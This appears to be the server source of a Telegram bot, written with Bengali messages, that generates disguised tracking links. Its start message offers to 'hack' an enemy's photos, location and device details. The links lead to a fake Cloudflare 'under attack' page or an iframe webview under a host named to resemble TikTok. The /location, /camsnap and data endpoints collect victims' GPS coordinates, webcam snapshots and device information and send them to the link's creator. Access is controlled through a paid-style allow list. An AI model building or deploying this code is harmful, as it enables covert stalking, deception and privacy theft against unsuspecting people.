const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL="https://tiktok-official.onrender.com";
// এই লাইনটি পরিবর্তন করা হয়েছে যেন লিঙ্ক শর্ট না হয়
var usecodetabs=false;

// আপনার Telegram User ID, যাকে Bot এর অ্যাডমিন বানানো হবে
const ownerId = 6246410156;

// অনুমোদিত ব্যবহারকারীদের তালিকা লোড করা
let allowedUsers = {};
try {
    allowedUsers = JSON.parse(fs.readFileSync('users.json', 'utf8'));
} catch (error) {
    // ফাইল না থাকলে, এটি একটি নতুন ফাইল তৈরি করবে।
    allowedUsers[ownerId] = {
        expires: 'forever'
    };
    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
}

// Bot কখন চালু হয়েছে, তা ট্র্যাক করার জন্য
const startTime = new Date();

// ইউজারকে অনুমতি আছে কিনা চেক করার ফাংশন
function isAllowed(userId) {
    if (userId === ownerId) {
        return true;
    }
    const user = allowedUsers[userId];
    if (!user) {
        return false;
    }
    if (user.expires === 'forever') {
        return true;
    }
    return new Date() < new Date(user.expires);
}

// অনুমোদিত ব্যবহারকারীদের তালিকা সেভ করার ফাংশন
function saveAllowedUsers() {
    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
}

app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:usecodetabs});
}
else{
res.redirect("https://t.me/ehtool");
}

});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:usecodetabs});
}
else{
res.redirect("https://t.me/ehtool");
}

});


bot.on('message', async (msg) => {
const chatId = msg.chat.id;

// শুধুমাত্র অনুমোদিত ব্যবহারকারীরাই বট ব্যবহার করতে পারবে
if (!isAllowed(chatId)) {
    bot.sendMessage(chatId, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉\n\n\nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
    return;
}

if(msg?.reply_to_message?.text=="🌐 আপনার লিঙ্কটি দিন"){
 createLink(chatId,msg.text);
}

if(msg.text=="/start"){
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
};

bot.sendMessage(chatId, `আসসালামু আলাইকুম, ${msg.chat.first_name} ! , \nআপনি এই বট ব্যবহার করে সামান্য একটি লিঙ্ক পাঠিয়ে আপনার শত্রুর ছবি, লোকেশন এবং তার ডিভাইসের বিভিন্ন তথ্য হ্যাক করে নিতে পারবেন।\n\nআরোও তথ্য জানার জন্য টাইপ করুন, /help`,m);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,`এই বটের মাধ্যমে আপনি কেবল একটি সহজ লিঙ্ক পাঠিয়ে মানুষদের ট্র্যাক করতে পারবেন।\n\nপ্রথমে /create লিখে সেন্ড করুন, তারপর বট আপনার কাছে একটা লিঙ্ক চাইবে, আমি যেকেনো একটা ভিডিও এর লিঙ্ক দিয়ে দিবেন।\nআপনার থেকে লিঙ্ক পেলে বট আপনার লিঙ্কে ম্যালওয়ার বসিয়ে আপনাকে আবার ২ টা লিঙ্ক দিবে।
\n\nSpecifications.
\n1. Cloudflare Link: এই পদ্ধতিতে তথ্য সংগ্রহের জন্য একটি ক্লাউডফ্লেয়ার আন্ডার অ্যাটাক পৃষ্ঠা দেখানো হবে এবং পরে ভিকটিমকে গন্তব্যস্থলের URL-এ পুনঃনির্দেশিত করা হবে।
\n2. Webview Link: এটি তথ্য সংগ্রহের জন্য আইফ্রেম ব্যবহার করে একটি ওয়েবসাইট (Ex bing, Dating site ইত্যাদি) দেখাবে।.
( ⚠️অনেক সাইটে x-ফ্রেম হেডার থাকলে এই পদ্ধতিতে কাজ নাও করতে পারে। যেমন https://google.com )
\n\nঅবশ্যই আমাদের চ্যানেলে জয়েন হবেন আরোও টুলস পাওয়ার জন্য\n Telegram Channel : https://t.me/ehtool\nFacebook Page : https://www.facebook.com/profile.php?id=61580675061865
`);
}
// নতুন কমান্ড: /allow <chat_id> <time>
else if (msg.text.startsWith('/allow')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
        return;
    }
    const parts = msg.text.split(' ');
    if (parts.length >= 2) {
        const userIdToAdd = parseInt(parts[1], 10);
        if (isNaN(userIdToAdd)) {
            bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id> [সময়]`);
            return;
        }

        let duration = 'forever';
        let expiresAt = 'forever';
        if (parts.length > 2) {
            duration = parts.slice(2).join(' ');
            const now = new Date();
            const timeValue = parseInt(duration);
            if (duration.endsWith('m')) {
                now.setMinutes(now.getMinutes() + timeValue);
            } else if (duration.endsWith('h')) {
                now.setHours(now.getHours() + timeValue);
            } else if (duration.endsWith('d')) {
                now.setDate(now.getDate() + timeValue);
            }
            expiresAt = now.toISOString();
        }
        
        allowedUsers[userIdToAdd] = { expires: expiresAt };
        saveAllowedUsers();

        const messageToUser = duration === 'forever' ?
            `অভিনন্দন! আপনাকে লাইফটাইমের জন্য বট ব্যবহারের অনুমতি দেওয়া হয়েছে।` :
            `অভিনন্দন! আপনাকে ${duration} সময়ের জন্য বট ব্যবহারের অনুমতি দেওয়া হয়েছে।`;
        
        bot.sendMessage(userIdToAdd, messageToUser);
        bot.sendMessage(chatId, `ইউজার আইডি ${userIdToAdd} সফলভাবে অনুমোদিত তালিকায় যুক্ত করা হয়েছে (${duration} এর জন্য)।`);

    } else {
        bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id> [সময়]`);
    }
}
// নতুন কমান্ড: /disallow <chat_id>
else if (msg.text.startsWith('/disallow')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
        return;
    }
    const parts = msg.text.split(' ');
    if (parts.length === 2) {
        const userIdToRemove = parseInt(parts[1], 10);
        if (!isNaN(userIdToRemove)) {
            if (allowedUsers[userIdToRemove]) {
                delete allowedUsers[userIdToRemove];
                saveAllowedUsers();
                bot.sendMessage(userIdToRemove, `দুঃখিত, আপনার বট ব্যবহারের অনুমতি প্রত্যাহার করা হয়েছে।`);
                bot.sendMessage(chatId, `ইউজার আইডি ${userIdToRemove} সফলভাবে অনুমোদিত তালিকা থেকে সরানো হয়েছে।`);
            } else {
                bot.sendMessage(chatId, `ইউজার আইডি ${userIdToRemove} অনুমোদিত তালিকায় নেই।`);
            }
        } else {
            bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /disallow <user_id>`);
        }
    } else {
        bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /disallow <user_id>`);
    }
}
// নতুন কমান্ড: /uptime
else if (msg.text === '/uptime') {
    const uptimeInSeconds = Math.floor((new Date() - startTime) / 1000);
    const hours = Math.floor(uptimeInSeconds / 3600);
    const minutes = Math.floor((uptimeInSeconds % 3600) / 60);
    const seconds = uptimeInSeconds % 60;
    bot.sendMessage(chatId, `বটটি চালু আছে ${hours} ঘন্টা, ${minutes} মিনিট, এবং ${seconds} সেকেন্ড ধরে।`);
}
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if (!isAllowed(callbackQuery.from.id)) {
    bot.sendMessage(callbackQuery.from.id, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉/n/n/nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
    return;
}
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
}
});
bot.on('polling_error', (error) => {
//console.log(error.code);
});


async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {

var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;

bot.sendChatAction(cid,"typing");
if(usecodetabs){
var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.codetabs.com/v1/proxy/?quest="+cUrl)}`).then(res => res.json());
var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.codetabs.com/v1/proxy/?quest="+wUrl)}`).then(res => res.json());

var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}

bot.sendMessage(cid, `নতুন লিঙ্কগুলি সফলভাবে তৈরি করা হয়েছে। আপনি নীচের যেকোনো একটি লিঙ্ক ব্যবহার করতে পারেন।.\nURL: ${msg}\n\n✅আপনার লিঙ্কগুলো\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
}
else{

bot.sendMessage(cid, `নতুন লিঙ্কগুলি সফলভাবে তৈরি করা হয়েছে।\nURL: ${msg}\n\n✅আপনার লিঙ্কগুলো\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`⚠️ দয়া করে একটি সঠিক লিঙ্ক দিন , লিঙ্কে অবশ্যই http অথবা https থাকতে হবে।`);
createNew(cid);

}
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 আপনার লিঙ্কটি দিন`,mk);
}


app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});


});


app.post("/location",(req,res)=>{


var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);

res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null;
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});


res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
    var uid=decodeURIComponent(req.body.uid) || null;
    var img=decodeURIComponent(req.body.img) || null;

    if(uid != null && img != null){
        
        // এখানে অতিরিক্ত চেক যুক্ত করা হয়েছে
        if (!img.startsWith('data:image/')) {
            console.log("Invalid image data received.");
            res.send("Invalid Image Data");
            return;
        }

        // Base64 প্রিফিক্স সরানো
        const base64Data = img.split(',')[1];
        if (!base64Data) {
            console.log("Empty Base64 data.");
            res.send("Empty Base64 Data");
            return;
        }

        try {
            var buffer=Buffer.from(base64Data,'base64');
            var info={
                filename:"camsnap.png",
                contentType: 'image/png'
            };

            bot.sendPhoto(parseInt(uid,36),buffer,{},info);
            res.send("Done");

        } catch (error) {
            console.log("Error processing image:", error);
            bot.sendMessage(parseInt(uid,36), `⚠️ দুঃখিত, ছবি প্রসেস করার সময় একটি সমস্যা হয়েছে।`);
            res.send("Error");
        }
    } else {
        res.send("No Data");
    }
});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
